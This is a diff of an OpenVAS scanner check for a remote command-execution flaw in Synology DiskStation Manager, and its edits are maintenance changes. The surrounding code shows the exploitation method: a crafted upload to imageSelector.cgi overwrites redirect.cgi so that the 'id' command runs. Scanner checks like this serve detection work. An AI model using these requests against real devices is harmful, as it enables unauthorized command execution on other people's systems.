@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_synology_dsm_64516.nasl 11191 2018-09-03 11:57:37Z mmartin $
+# $Id: gb_synology_dsm_64516.nasl 11222 2018-09-04 12:41:44Z cfischer $
 #
 # Synology DiskStation Manager 'imageSelector.cgi' Remote Command Execution Vulnerability
 #
@@ -27,20 +27,20 @@
 
 CPE = "cpe:/o:synology:dsm";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103869");
   script_bugtraq_id(64516);
   script_cve_id("CVE-2013-6955");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_version("$Revision: 11191 $");
+  script_version("$Revision: 11222 $");
 
   script_name("Synology DiskStation Manager 'imageSelector.cgi' Remote Command Execution Vulnerability");
 
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64516");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-09-03 13:57:37 +0200 (Mon, 03 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 14:41:44 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-01-07 14:57:33 +0100 (Tue, 07 Jan 2014)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -60,20 +60,20 @@ if (description)
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"summary", value:"Synology DiskStation Manager is prone to a remote command-execution
  vulnerability.");
-  script_tag(name:"affected", value:"Synology DiskStation Manager 4.x are vulnerable; other versions may
+  script_tag(name:"affected", value:"Synology DiskStation Manager 4.x are vulnerable. Other versions may
  also be affected.");
 
   script_tag(name:"qod_type", value:"remote_app");
 
- exit(0);
+  exit(0);
 }
 
 include("host_details.inc");
 include("http_func.inc");
 
-
 if ( ! port = get_app_port( cpe:CPE ) )exit( 0 );
 
+useragent = get_http_user_agent();
 host = http_host_name(port:port);
 
 function send_post_request ( cmd )
@@ -102,7 +102,7 @@ function send_post_request ( cmd )
 
   req = 'POST /webman/imageSelector.cgi HTTP/1.1\r\n' +
         'Host: ' + host + '\r\n' +
-        'User-Agent: ' + OPENVAS_HTTP_USER_AGENT  +'\r\n' +
+        'User-Agent: ' + useragent + '\r\n' +
         'X-TYPE-NAME: SLICEUPLOAD\r\n' +
         'X-TMP-FILE: /usr/syno/synoman/redirect.cgi\r\n' +
         'Content-Type: multipart/form-data; boundary=' + boundary + '\r\n' +
@@ -121,7 +121,7 @@ function send_get_request()
 
   req = 'GET /redirect.cgi HTTP/1.1\r\n' +
         'Host: ' + host + '\r\n' +
-        'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+        'User-Agent: ' + useragent + '\r\n' +
         'Content-Type: application/x-www-form-urlencoded\r\n' +
         'Content-Length: 0\r\n\r\n';
 
@@ -144,4 +144,3 @@ if ( send_post_request( cmd:'id' ) )
 }
 
 exit( 99 );
-
